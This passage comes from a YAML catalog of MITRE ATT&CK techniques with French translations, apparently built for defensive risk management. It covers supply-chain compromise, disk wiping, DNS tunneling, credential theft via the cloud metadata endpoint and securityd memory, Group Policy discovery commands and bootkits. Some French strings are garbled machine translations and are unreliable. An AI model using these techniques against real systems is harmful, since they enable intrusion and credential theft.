      NPM Packages)(Citation: Meyer PyPI Supply Chain Attack Uncovered)(Citation:
      Checkmarx-oss-seo)


      Additionally, CI/CD pipeline components, such as GitHub Actions, may be targeted
      in order to gain access to the building, testing, and deployment cycles of an
      application.(Citation: Unit 42 Palo Alto GitHub Actions Supply Chain Attack
      2025) By adding malicious code into a GitHub action, a threat actor may be able
      to collect runtime credentials (e.g., via [Proc Filesystem](https://attack.mitre.org/techniques/T1003/007))
      or insert further malicious components into the build pipelines for a second-order
      supply chain compromise.(Citation: OWASP CICD-SEC-4) As GitHub Actions are often
      dependent on other GitHub Actions, threat actors may be able to infect a large
      number of repositories via the compromise of a single Action.(Citation: Palo
      Alto Networks GitHub Actions Worm 2023)


      Targeting may be specific to a desired victim set or may be distributed to a
      broad set of consumers but only move on to additional tactics on specific victims.

      https://attack.mitre.org/techniques/T1195/001'
    translations:
      fr:
        name: "Compromission des d\xE9pendances logicielles et des outils de d\xE9\
          veloppement"
        description: "Les adversaires peuvent manipuler des d\xE9pendances logicielles\
          \ et des outils de d\xE9veloppement avant leur r\xE9ception par un consommateur\
          \ final dans le but de compromettre des donn\xE9es ou du syst\xE8me. Les\
          \ applications d\xE9pendent souvent de logiciels externes pour fonctionner\
          \ correctement. Les projets open source populaires utilis\xE9s comme d\xE9\
          pendances dans de nombreuses applications, tels que les paquets pip et NPM,\
          \ peuvent \xEAtre cibl\xE9s comme moyen d'ajouter du code malveillant aux\
          \ utilisateurs de la d\xE9pendance. (Citation : Compromis Trendmicro NPM)(Citation\
          \ : D\xE9p\xF4ts NPM Bitdefender compromis en 2021)(Citation : MANDVI Packages\
          \ malveillants npm et PyPI d\xE9guis\xE9s) Cela peut \xE9galement inclure\
          \ des colis abandonn\xE9s, qui dans certains cas peuvent \xEAtre r\xE9enregistr\xE9\
          s par des acteurs malveillants apr\xE8s avoir \xE9t\xE9 retir\xE9s par des\
          \ adversaires. (Citation : Le d\xE9tournement de la renaissance du PyPi\
          \ de Hacker News 2024) Les adversaires peuvent \xE9galement recourir au\
          \ \xAB typosquatting \xBB ou \xE0 la confusion de noms en choisissant des\
          \ noms similaires \xE0 des biblioth\xE8ques ou packages populaires existants\
          \ afin de tromper un utilisateur. (Citation : Portes d\xE9rob\xE9es d'Ahmed\
          \ dans les paquets Python et NPM)(Citation : Attaque de la cha\xEEne d'approvisionnement\
          \ Meyer PyPI d\xE9couverte au d\xE9couvert)(Citation : Checkmarx-oss-seo)\n\
          \nDe plus, les composants du pipeline CI/CD, tels que les actions GitHub,\
          \ peuvent \xEAtre cibl\xE9s afin d'acc\xE9der aux cycles de construction,\
          \ de test et de d\xE9ploiement d'une application. (Citation : Attaque de\
          \ la cha\xEEne d'approvisionnement 2025 des actions GitHub de l'unit\xE9\
          \ 42 Palo Alto) En ajoutant du code malveillant dans une action GitHub,\
          \ un acteur de menace peut collecter des identifiants d'ex\xE9cution (par\
          \ exemple, via [Proc\xE9s Filesystem](https://attack.mitre.org/techniques/T1003/007))\
          \ ou ins\xE9rer d'autres composants malveillants dans les pipelines de construction\
          \ pour une compromission de la cha\xEEne d'approvisionnement de second ordre.\
          \ (Citation : OWASP CICD-SEC-4) Comme les actions GitHub d\xE9pendent souvent\
          \ d'autres actions GitHub, les acteurs malveillants peuvent \xEAtre capables\
          \ d'infecter un grand nombre de d\xE9p\xF4ts via la compromission d'une\
          \ seule action. (Citation : ver actions GitHub Palo Alto Networks 2023)\n\
          \n Le ciblage peut \xEAtre sp\xE9cifique \xE0 un ensemble de victimes souhait\xE9\
          \ ou distribu\xE9 \xE0 un large \xE9ventail de consommateurs mais ne passer\
          \ qu'\xE0 des tactiques suppl\xE9mentaires sur des victimes sp\xE9cifiques.https\_\
          :// attack.mitre.org/techniques/T1195/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.004
    ref_id: T1588.004
    name: Digital Certificates
    description: 'Adversaries may buy and/or steal SSL/TLS certificates that can be
      used during targeting. SSL/TLS certificates are designed to instill trust. They
      include information about the key, information about its owner''s identity,
      and the digital signature of an entity that has verified the certificate''s
      contents are correct. If the signature is valid, and the person examining the
      certificate trusts the signer, then they know they can use that key to communicate
      with its owner.


      Adversaries may purchase or steal SSL/TLS certificates to further their operations,
      such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)
      with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even
      enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      if the certificate is trusted or otherwise added to the root of trust (i.e.
      [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).
      The purchase of digital certificates may be done using a front organization
      or using information stolen from a previously compromised entity that allows
      the adversary to validate to a certificate provider as that entity. Adversaries
      may also steal certificate materials directly from a compromised third-party,
      including from certificate authorities.(Citation: DiginotarCompromise) Adversaries
      may register or hijack domains that they will later purchase an SSL/TLS certificate
      for.


      Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates,
      such as domain validation certificates, for free.(Citation: Let''s Encrypt FAQ)


      After obtaining a digital certificate, an adversary may then install that certificate
      (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003))
      on infrastructure under their control.

      https://attack.mitre.org/techniques/T1588/004'
    translations:
      fr:
        name: "Certificats num\xE9riques"
        description: "Les adversaires peuvent acheter et/ou voler des certificats\
          \ SSL/TLS qui peuvent \xEAtre utilis\xE9s lors du ciblage. Les certificats\
          \ SSL/TLS sont con\xE7us pour instaurer la confiance. Ils incluent des informations\
          \ sur la cl\xE9, des informations sur l'identit\xE9 de son propri\xE9taire,\
          \ ainsi que la signature num\xE9rique d'une entit\xE9 ayant v\xE9rifi\xE9\
          \ que le contenu du certificat est correct. Si la signature est valide et\
          \ que la personne qui examine le certificat fait confiance au signataire,\
          \ elle sait alors qu'elle peut utiliser cette cl\xE9 pour communiquer avec\
          \ son propri\xE9taire.\n\nLes adversaires peuvent acheter ou voler des certificats\
          \ SSL/TLS pour poursuivre leurs op\xE9rations, comme chiffrer le trafic\
          \ C2 (ex : [Cryptographie asym\xE9trique](https://attack.mitre.org/techniques/T1573/002)\
          \ avec [Protocoles Web](https://attack.mitre.org/techniques/T1071/001))\
          \ ou m\xEAme activer [Adversaire-in-the-Middle](https://attack.mitre.org/techniques/T1557)\
          \ si le certificat est fiable ou ajout\xE9 \xE0 la racine de confiance (c'est-\xE0\
          -dire [Installer la racine Certificat](https://attack.mitre.org/techniques/T1553/004)).\
          \ L'achat de certificats num\xE9riques peut se faire via une organisation\
          \ \xE9cran ou \xE0 l'aide d'informations vol\xE9es \xE0 une entit\xE9 pr\xE9\
          c\xE9demment compromise, permettant \xE0 l'adversaire de valider aupr\xE8\
          s d'un fournisseur de certificats en tant qu'entit\xE9. Les adversaires\
          \ peuvent \xE9galement voler des documents de certificat directement aupr\xE8\
          s d'un tiers compromis, y compris aupr\xE8s des autorit\xE9s de certification.\
          \ (Citation : DiginotarCompromise) Les adversaires peuvent enregistrer ou\
          \ d\xE9tourner des domaines pour lesquels ils ach\xE8teront ensuite un certificat\
          \ SSL/TLS.\n\nDes autorit\xE9s de certification existent qui permettent\
          \ aux adversaires d'acqu\xE9rir gratuitement des certificats SSL/TLS, tels\
          \ que les certificats de validation de domaine. (Citation : FAQ Let's Encrypt)\n\
          \nApr\xE8s avoir obtenu un certificat num\xE9rique, un adversaire peut alors\
          \ installer ce certificat (voir [Installer le certificat num\xE9rique](https://attack.mitre.org/techniques/T1608/003))\
          \ sur l'infrastructure sous son contr\xF4le.https\_://attack.mitre.org/techniques/T1588/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.002
    ref_id: T1583.002
    name: DNS Server
    description: 'Adversaries may set up their own Domain Name System (DNS) servers
      that can be used during targeting. During post-compromise activity, adversaries
      may utilize DNS traffic for various tasks, including for Command and Control
      (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)).
      Instead of hijacking existing DNS servers, adversaries may opt to configure
      and run their own DNS servers in support of operations.


      By running their own DNS servers, adversaries can have more control over how
      they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)).
      With control over a DNS server, adversaries can configure DNS applications to
      provide conditional responses to malware and, generally, have more flexibility
      in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)

      https://attack.mitre.org/techniques/T1583/002'
    translations:
      fr:
        name: Serveur DNS
        description: "Les adversaires peuvent configurer leurs propres serveurs DNS\
          \ (Domain Name System) qui peuvent \xEAtre utilis\xE9s lors du ciblage.\
          \ Lors d'une activit\xE9 post-compromis, les adversaires peuvent utiliser\
          \ le trafic DNS pour diverses t\xE2ches, notamment pour la Commande et le\
          \ Contr\xF4le (ex : [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)).\
          \ Au lieu de d\xE9tourner les serveurs DNS existants, les adversaires peuvent\
          \ choisir de configurer et d'ex\xE9cuter leurs propres serveurs DNS pour\
          \ soutenir les op\xE9rations.\n\nEn faisant fonctionner leurs propres serveurs\
          \ DNS, les adversaires peuvent avoir plus de contr\xF4le sur la mani\xE8\
          re dont ils administrent le trafic DNS C2 c\xF4t\xE9 serveur ([DNS](https://attack.mitre.org/techniques/T1071/004)).\
          \ Avec le contr\xF4le d'un serveur DNS, les adversaires peuvent configurer\
          \ les applications DNS pour fournir des r\xE9ponses conditionnelles aux\
          \ logiciels malveillants et, en g\xE9n\xE9ral, avoir plus de flexibilit\xE9\
          \ dans la structure du canal C2 bas\xE9 sur DNS. (Citation : Unit42 DNS\
          \ mars 2019)https://attack.mitre.org/techniques/T1583/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561
    ref_id: T1561
    name: Disk Wipe
    description: 'Adversaries may wipe or corrupt raw disk data on specific systems
      or in large numbers in a network to interrupt availability to system and network
      resources. With direct write access to a disk, adversaries may attempt to overwrite
      portions of disk data. Adversaries may opt to wipe arbitrary portions of disk
      data and/or wipe disk structures like the master boot record (MBR). A complete
      wipe of all disk sectors may be attempted.


      To maximize impact on the target organization in operations where network-wide
      availability interruption is the goal, malware used for wiping disks may have
      worm-like features to propagate across a network by leveraging additional techniques
      like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential
      Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin
      Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster
      Destructive Malware)


      On network devices, adversaries may wipe configuration files and other data
      from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      commands such as `erase`.(Citation: erase_cmd_cisco)

      https://attack.mitre.org/techniques/T1561'
    translations:
      fr:
        name: Effacement du disque
        description: "Les adversaires peuvent effacer ou corrompre les donn\xE9es\
          \ brutes du disque sur des syst\xE8mes sp\xE9cifiques ou en grand nombre\
          \ dans un r\xE9seau afin d'interrompre la disponibilit\xE9 des ressources\
          \ syst\xE8me et r\xE9seau. Avec un acc\xE8s direct en \xE9criture \xE0 un\
          \ disque, les adversaires peuvent tenter d'\xE9craser des parties des donn\xE9\
          es du disque. Les adversaires peuvent choisir d'effacer des portions arbitraires\
          \ des donn\xE9es disque et/ou d'effacer les structures du disque comme le\
          \ master boot record (MBR). Un effacement complet de tous les secteurs du\
          \ disque peut \xEAtre tent\xE9.\n\nPour maximiser l'impact sur l'organisation\
          \ cible dans les op\xE9rations o\xF9 l'interruption de disponibilit\xE9\
          \ \xE0 l'\xE9chelle du r\xE9seau est l'objectif, les logiciels malveillants\
          \ utilis\xE9s pour effacer les disques peuvent disposer de fonctionnalit\xE9\
          s de type ver pour se propager \xE0 travers le r\xE9seau en utilisant des\
          \ techniques suppl\xE9mentaires telles que [Comptes valides](https://attack.mitre.org/techniques/T1078),\
          \ [Dumping des identifiants du syst\xE8me d'exploitation](https://attack.mitre.org/techniques/T1003)\
          \ et [Partages d'administration SMB/Windows](https://attack.mitre.org/techniques/T1021/002).\
          \ (Citation : Malware destructeur du Novetta Blockbuster)\n\nSur les appareils\
          \ r\xE9seau, les adversaires peuvent effacer les fichiers de configuration\
          \ et d'autres donn\xE9es de l'appareil en utilisant des commandes [CLI du\
          \ dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008) telles\
          \ que \xAB effacer \xBB. (Citation : erase_cmd_cisco) https://attack.mitre.org/techniques/T1561"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.004
    ref_id: T1071.004
    name: DNS
    description: "Adversaries may communicate using the Domain Name System (DNS) application\
      \ layer protocol to avoid detection/network filtering by blending in with existing\
      \ traffic. Commands to the remote system, and often the results of those commands,\
      \ will be embedded within the protocol traffic between the client and server.\
      \ \n\nThe DNS protocol serves an administrative function in computer networking\
      \ and thus may be very common in environments. DNS traffic may also be allowed\
      \ even before network authentication is completed. DNS packets contain many\
      \ fields and headers in which data can be concealed. Often known as DNS tunneling,\
      \ adversaries may abuse DNS to communicate with systems under their control\
      \ within a victim network while also mimicking normal, expected traffic.(Citation:\
      \ PAN DNS Tunneling)(Citation: Medium DnsTunneling)\n\nDNS beaconing may be\
      \ used to send commands to remote systems via DNS queries. A DNS beacon is created\
      \ by tunneling DNS traffic (i.e.\u202F[Protocol Tunneling](https://attack.mitre.org/techniques/T1572)).\
      \ The commands may be embedded into different DNS records, for example, TXT\
      \ or A records.(Citation: OilRig Uses Updated BONDUPDATER to Target Middle Eastern\
      \ Government) DNS beacons may be difficult to detect because the beacons infrequently\
      \ communicate with infected devices.(Citation: DNS Beacons) Infrequent communication\
      \ conceals the malicious DNS traffic with normal DNS traffic.\nhttps://attack.mitre.org/techniques/T1071/004"
    translations:
      fr:
        name: DNS
        description: "Les adversaires peuvent communiquer en utilisant le protocole\
          \ de couche application Domain Name System (DNS) afin d'\xE9viter la d\xE9\
          tection ou le filtrage r\xE9seau en se fondant dans le trafic existant.\
          \ Les commandes vers le syst\xE8me distant, et souvent les r\xE9sultats\
          \ de ces commandes, seront int\xE9gr\xE9es dans le trafic protocolaire entre\
          \ le client et le serveur. \n\nLe protocole DNS remplit une fonction administrative\
          \ dans les r\xE9seaux informatiques et peut donc \xEAtre tr\xE8s courant\
          \ dans les environnements. Le trafic DNS peut \xE9galement \xEAtre autoris\xE9\
          \ avant m\xEAme que l'authentification r\xE9seau ne soit termin\xE9e. Les\
          \ paquets DNS contiennent de nombreux champs et en-t\xEAtes dans lesquels\
          \ les donn\xE9es peuvent \xEAtre dissimul\xE9es. Souvent appel\xE9 tunneling\
          \ DNS, les adversaires peuvent abuser du DNS pour communiquer avec les syst\xE8\
          mes sous leur contr\xF4le au sein d'un r\xE9seau victime tout en imitant\
          \ le trafic normal et attendu. (Citation : Tunnel DNS PAN)(Citation : Tunneling\
          \ Dns Moyen)\n\nLe balisage DNS peut \xEAtre utilis\xE9 pour envoyer des\
          \ commandes \xE0 des syst\xE8mes distants via des requ\xEAtes DNS. Une balise\
          \ DNS est cr\xE9\xE9e en tunnellant le trafic DNS (c'est-\xE0-dire [Protocole\
          \ Tunneling](https://attack.mitre.org/techniques/T1572)). Les commandes\
          \ peuvent \xEAtre int\xE9gr\xE9es dans diff\xE9rents enregistrements DNS,\
          \ par exemple les enregistrements TXT ou A. (Citation : OilRig utilise un\
          \ BONDUPDATER mis \xE0 jour pour cibler le gouvernement du Moyen-Orient)\
          \ Les balises DNS peuvent \xEAtre difficiles \xE0 d\xE9tecter car elles\
          \ communiquent rarement avec les appareils infect\xE9s. (Citation : Balises\
          \ DNS) Une communication peu fr\xE9quente dissimule le trafic DNS malveillant\
          \ avec le trafic DNS normal.https\_://attack.mitre.org/techniques/T1071/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.005
    ref_id: T1552.005
    name: Cloud Instance Metadata API
    description: 'Adversaries may attempt to access the Cloud Instance Metadata API
      to collect credentials and other sensitive data.


      Most cloud service providers support a Cloud Instance Metadata API which is
      a service provided to running virtual instances that allows applications to
      access information about the running virtual instance. Available information
      generally includes name, security group, and additional metadata including sensitive
      data such as credentials and UserData scripts that may contain additional secrets.
      The Instance Metadata API is provided as a convenience to assist in managing
      applications and is accessible by anyone who can access the instance.(Citation:
      AWS Instance Metadata API) A cloud metadata API has been used in at least one
      high profile compromise.(Citation: Krebs Capital One August 2019)


      If adversaries have a presence on the running virtual instance, they may query
      the Instance Metadata API directly to identify credentials that grant access
      to additional resources. Additionally, adversaries may exploit a Server-Side
      Request Forgery (SSRF) vulnerability in a public facing web proxy that allows
      them to gain access to the sensitive information via a request to the Instance
      Metadata API.(Citation: RedLock Instance Metadata API 2018)


      The de facto standard across cloud service providers is to host the Instance
      Metadata API at <code>http[:]//169.254.169.254</code>.

      https://attack.mitre.org/techniques/T1552/005'
    translations:
      fr:
        name: "API de m\xE9tadonn\xE9es d'instance cloud"
        description: "Les adversaires peuvent tenter d'acc\xE9der \xE0 l'API de m\xE9\
          tadonn\xE9es d'instance cloud pour collecter des identifiants et d'autres\
          \ donn\xE9es sensibles.\n\nLa plupart des fournisseurs de services cloud\
          \ prennent en charge une API de m\xE9tadonn\xE9es d'instance cloud, un service\
          \ fourni aux instances virtuelles en cours de cours permettant aux applications\
          \ d'acc\xE9der aux informations sur l'instance virtuelle en cours. Les informations\
          \ disponibles incluent g\xE9n\xE9ralement le nom, le groupe de s\xE9curit\xE9\
          \ et des m\xE9tadonn\xE9es suppl\xE9mentaires, y compris des donn\xE9es\
          \ sensibles telles que des identifiants et des scripts UserData pouvant\
          \ contenir des secrets suppl\xE9mentaires. L'API de m\xE9tadonn\xE9es d'instance\
          \ est fournie comme une commodit\xE9 pour faciliter la gestion des applications\
          \ et est accessible \xE0 toute personne pouvant acc\xE9der \xE0 l'instance.\
          \ (Citation : API de m\xE9tadonn\xE9es d'instance AWS) Une API de m\xE9\
          tadonn\xE9es cloud a \xE9t\xE9 utilis\xE9e dans au moins une compromission\
          \ tr\xE8s m\xE9diatis\xE9e. (Citation : Krebs Capital One ao\xFBt 2019)\n\
          \nSi des adversaires sont pr\xE9sents sur l'instance virtuelle en cours,\
          \ ils peuvent interroger directement l'API de m\xE9tadonn\xE9es d'instance\
          \ pour identifier les identifiants qui accordent l'acc\xE8s \xE0 des ressources\
          \ suppl\xE9mentaires. De plus, les adversaires peuvent exploiter une vuln\xE9\
          rabilit\xE9 de falsification de requ\xEAte c\xF4t\xE9 serveur (SSRF) dans\
          \ un proxy web public qui leur permet d'acc\xE9der aux informations sensibles\
          \ via une requ\xEAte \xE0 l'API de m\xE9tadonn\xE9es d'instance. (Citation\
          \ : API de m\xE9tadonn\xE9es d'instance RedLock 2018)\n\nLa norme de facto\
          \ chez les fournisseurs de services cloud est d'h\xE9berger l'API de m\xE9\
          tadonn\xE9es d'instance \xE0 <code>http[\_:]//169.254.169.254</code>.https://attack.mitre.org/techniques/T1552/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.002
    ref_id: T1555.002
    name: Securityd Memory
    description: "An adversary with root access may gather credentials by reading\
      \ `securityd`\u2019s memory. `securityd` is a service/daemon responsible for\
      \ implementing security protocols such as encryption and authorization.(Citation:\
      \ Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s\
      \ memory to find the correct sequence of keys to decrypt the user\u2019s logon\
      \ keychain. This may provide the adversary with various plaintext passwords,\
      \ such as those for users, WiFi, mail, browsers, certificates, secure notes,\
      \ etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior\
      \ to El Capitan, users with root access can read plaintext keychain passwords\
      \ of logged-in users because Apple\u2019s keychain implementation allows these\
      \ credentials to be cached so that users are not repeatedly prompted for passwords.(Citation:\
      \ OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd`\
      \ utility takes the user\u2019s logon password, encrypts it with PBKDF2, and\
      \ stores this master key in memory. Apple also uses a set of keys and algorithms\
      \ to encrypt the user\u2019s password, but once the master key is found, an\
      \ adversary need only iterate over the other values to unlock the final password.(Citation:\
      \ OS X Keychain)\nhttps://attack.mitre.org/techniques/T1555/002"
    translations:
      fr:
        name: "M\xE9moire s\xE9curis\xE9e"
        description: "Un adversaire ayant un acc\xE8s root peut rassembler des identifiants\
          \ en lisant la m\xE9moire de \xAB securityd \xBB. \xAB securityd \xBB est\
          \ un service/d\xE9mon responsable de la mise en \u0153uvre de protocoles\
          \ de s\xE9curit\xE9 tels que le chiffrement et l'autorisation. (Citation\
          \ : Apple Dev SecurityD) Un adversaire privil\xE9gi\xE9 peut \xEAtre capable\
          \ de scanner la m\xE9moire de \xAB s\xE9curis\xE9 \xBB pour trouver la s\xE9\
          quence correcte de cl\xE9s afin de d\xE9chiffrer le porte-cl\xE9s de connexion\
          \ de l'utilisateur. Cela peut fournir \xE0 l'adversaire divers mots de passe\
          \ en clair, tels que ceux des utilisateurs, le WiFi, le courrier, les navigateurs,\
          \ les certificats, les notes s\xE9curis\xE9es, etc. (Citation : OS X Keychain)\
          \ (Citation : OSX Keydnap Malware) \n\nDans OS X avant El Capitan, les utilisateurs\
          \ ayant un acc\xE8s root pouvaient lire les mots de passe en clair des utilisateurs\
          \ connect\xE9s car l'impl\xE9mentation du porte-cl\xE9s d'Apple permet de\
          \ mettre ces identifiants en cache afin que les utilisateurs ne soient pas\
          \ sollicit\xE9s \xE0 r\xE9p\xE9tition pour les mots de passe. Citation :\
          \ OS X Keychain) (Citation : Externe \xE0 DA, \xE0 la mani\xE8re OS X) L'utilitaire\
          \ \xAB s\xE9curis\xE9 \xBB d'Apple prend le mot de passe de connexion de\
          \ l'utilisateur, le chiffre avec PBKDF2, et stocke cette cl\xE9 ma\xEEtresse\
          \ en m\xE9moire. Apple utilise \xE9galement un ensemble de cl\xE9s et d'algorithmes\
          \ pour chiffrer le mot de passe de l'utilisateur, mais une fois la cl\xE9\
          \ ma\xEEtresse trouv\xE9e, un adversaire n'a qu'\xE0 it\xE9rer sur les autres\
          \ valeurs pour d\xE9bloquer le mot de passe final. (Citation : Porte-cl\xE9\
          s OS X)https://attack.mitre.org/techniques/T1555/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1615
    ref_id: T1615
    name: Group Policy Discovery
    description: 'Adversaries may gather information on Group Policy settings to identify
      paths for privilege escalation, security measures applied within a domain, and
      to discover patterns in domain objects that can be manipulated or used to blend
      in the environment. Group Policy allows for centralized management of user and
      computer settings in Active Directory (AD). Group policy objects (GPOs) are
      containers for group policy settings made up of files stored within a predictable
      network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group
      Policy Basics)(Citation: ADSecurity GPO Persistence 2016)


      Adversaries may use commands such as <code>gpresult</code> or various publicly
      available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>,
      to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation:
      Github PowerShell Empire) Adversaries may use this information to shape follow-on
      behaviors, including determining potential attack paths within the target network
      as well as opportunities to manipulate Group Policy settings (i.e. [Domain or
      Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for
      their benefit.

      https://attack.mitre.org/techniques/T1615'
    translations:
      fr:
        name: "D\xE9couverte de la police de groupe"
        description: "Les adversaires peuvent recueillir des informations sur les\
          \ param\xE8tres de la Politique de Groupe afin d'identifier les chemins\
          \ d'escalade des privil\xE8ges, les mesures de s\xE9curit\xE9 appliqu\xE9\
          es dans un domaine, et pour d\xE9couvrir des motifs dans les objets de domaine\
          \ pouvant \xEAtre manipul\xE9s ou utilis\xE9s pour se fondre dans l'environnement.\
          \ La Strat\xE9gie de Groupe permet une gestion centralis\xE9e des param\xE8\
          tres utilisateur et informatique dans Active Directory (AD). Les objets\
          \ de politique de groupe (GPO) sont des conteneurs pour les param\xE8tres\
          \ de politique de groupe compos\xE9s de fichiers stock\xE9s dans un chemin\
          \ r\xE9seau pr\xE9visible '\\<DOMAINE>\\SYSVOL\\<DOMAINE>\\Politiques\\\
          '. (Citation : Bases de la politique de groupe TechNet)(Citation : ADSecurity\
          \ GPO Persistence 2016)\n\nLes adversaires peuvent utiliser des commandes\
          \ telles que <code>gpresult</code> ou diverses fonctions PowerShell publiques,\
          \ telles que <code>Get-DomainGPO</code> et <code>Get-DomainGPOLocalGroup</code>,\
          \ pour recueillir des informations sur les param\xE8tres de la Strat\xE9\
          gie de Groupe. (Citation : Microsoft gpresult)(Citation : Github PowerShell\
          \ Empire) Les adversaires peuvent utiliser ces informations pour fa\xE7\
          onner les comportements suivants, notamment pour d\xE9terminer les chemins\
          \ d'attaque potentiels au sein du r\xE9seau cible ainsi que les opportunit\xE9\
          s de manipuler les param\xE8tres de la politique de groupe (par exemple\
          \ [Modification de la politique de domaine ou de locataire](https://attack.mitre.org/techniques/T1484))\
          \ \xE0 leur avantage.https\_://attack.mitre.org/techniques/T1615"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.003
    ref_id: T1542.003
    name: Bootkit
    description: 'Adversaries may use bootkits to persist on systems. A bootkit is
      a malware variant that modifies the boot sectors of a hard drive, allowing malicious
      code to execute before a computer''s operating system has loaded. Bootkits reside
      at a layer below the operating system and may make it difficult to perform full
      remediation unless an organization suspects one was used and can act accordingly.


      In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume
      Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section
      of disk that is first loaded after completing hardware initialization by the
      BIOS. It is the location of the boot loader. An adversary who has raw access
      to the boot drive may overwrite this area, diverting execution during startup
      from the normal boot loader to adversary code.(Citation: Lau 2011)


      The MBR passes control of the boot process to the VBR. Similar to the case of
      MBR, an adversary who has raw access to the boot drive may overwrite the VBR
      to divert execution during startup to adversary code.


      In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead
      create or modify files in the EFI system partition (ESP). The ESP is a partition
      on data storage used by devices containing UEFI that allows the system to boot
      the OS and other utilities used by the system. An adversary can use the newly
      created or patched files in the ESP to run malicious kernel code.(Citation:
      Microsoft Security)(Citation: welivesecurity)

      https://attack.mitre.org/techniques/T1542/003'
    translations:
      fr:
        name: "Kit de d\xE9marrage"
        description: "Les adversaires peuvent utiliser des bootkits pour persister\
          \ sur les syst\xE8mes. Un kit de d\xE9marrage est une variante de malware\
          \ qui modifie les secteurs de d\xE9marrage d'un disque dur, permettant \xE0\
          \ un code malveillant de s'ex\xE9cuter avant que le syst\xE8me d'exploitation\
          \ d'un ordinateur ne soit charg\xE9. Les kits de d\xE9marrage se trouvent\
          \ \xE0 une couche inf\xE9rieure au syst\xE8me d'exploitation et peuvent\
          \ rendre difficile la rem\xE9diation compl\xE8te, sauf si une organisation\
          \ soup\xE7onne qu'un mod\xE8le a \xE9t\xE9 utilis\xE9 et peut agir en cons\xE9\
          quence.\n\nDans les syst\xE8mes BIOS, un kit d'amor\xE7age peut modifier\
          \ l'enregistrement de d\xE9marrage principal (MBR) et/ou l'enregistrement\
          \ de d\xE9marrage de volume (VBR). (Citation : Mandiant M Trends 2016) Le\
          \ MBR est la section du disque qui est charg\xE9e en premier apr\xE8s avoir\
          \ termin\xE9 l'initialisation mat\xE9rielle par le BIOS. C'est l'emplacement\
          \ du chargeur d'amor\xE7age. Un adversaire ayant un acc\xE8s brut au disque\
          \ de d\xE9marrage peut \xE9craser cette zone, d\xE9tournant l'ex\xE9cution\
          \ lors du d\xE9marrage du chargeur de d\xE9marrage normal vers le code adversaire.\
          \ (Citation : Lau 2011)\n\nLe MBR transmet le contr\xF4le du processus de\
          \ d\xE9marrage au VBR. Similaire au cas du MBR, un adversaire ayant un acc\xE8\
          s brut au disque de d\xE9marrage peut \xE9craser le VBR pour d\xE9tourner\
          \ l'ex\xE9cution lors du d\xE9marrage vers le code adversaire.\n\nDans les\
          \ syst\xE8mes UEFI (Unified Extensible Firmware Interface), un kit de d\xE9\
          marrage peut \xE0 la place cr\xE9er ou modifier des fichiers dans la partition\
          \ syst\xE8me EFI (ESP). L'ESP est une partition sur le stockage de donn\xE9\
          es utilis\xE9e par les appareils contenant UEFI qui permet au syst\xE8me\
          \ de d\xE9marrer le syst\xE8me d'exploitation et d'autres utilitaires utilis\xE9\
          s par le syst\xE8me. Un adversaire peut utiliser les fichiers nouvellement\
          \ cr\xE9\xE9s ou corrig\xE9s dans l'ESP pour ex\xE9cuter du code malveillant\
          \ du noyau. (Citation : Microsoft Security)(Citation : welivesecurity) https://attack.mitre.org/techniques/T1542/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1025
    ref_id: T1025
    name: Data from Removable Media
    description: "Adversaries may search connected removable media on computers they\
      \ have compromised to find files of interest. Sensitive data can be collected\
      \ from any removable media (optical disk drive, USB memory, etc.) connected\
      \ to the compromised system prior to Exfiltration. Interactive command shells\
      \ may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106)\
      \ may be used to gather information. \n\nSome adversaries may also use [Automated\
      \ Collection](https://attack.mitre.org/techniques/T1119) on removable media.\n\
      https://attack.mitre.org/techniques/T1025"
    translations:
      fr:
        name: "Donn\xE9es issues de supports amovibles"
        description: "Les adversaires peuvent fouiller les supports amovibles connect\xE9\
          s sur des ordinateurs qu'ils ont compromis pour trouver des fichiers d'int\xE9\
          r\xEAt. Les donn\xE9es sensibles peuvent \xEAtre collect\xE9es \xE0 partir\
          \ de tout support amovible (disque optique, m\xE9moire USB, etc.) connect\xE9\
          \ au syst\xE8me compromis avant l'Exfiltration. Des shells de commande interactifs\
          \ peuvent \xEAtre utilis\xE9s, et des fonctionnalit\xE9s courantes dans\
          \ [cmd](https://attack.mitre.org/software/S0106) peuvent \xEAtre utilis\xE9\
          es pour recueillir des informations. \n\nCertains adversaires peuvent \xE9\
          galement utiliser [Automated Collection](https://attack.mitre.org/techniques/T1119)\
          \ sur des supports amovibles.https\_://attack.mitre.org/techniques/T1025"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.013
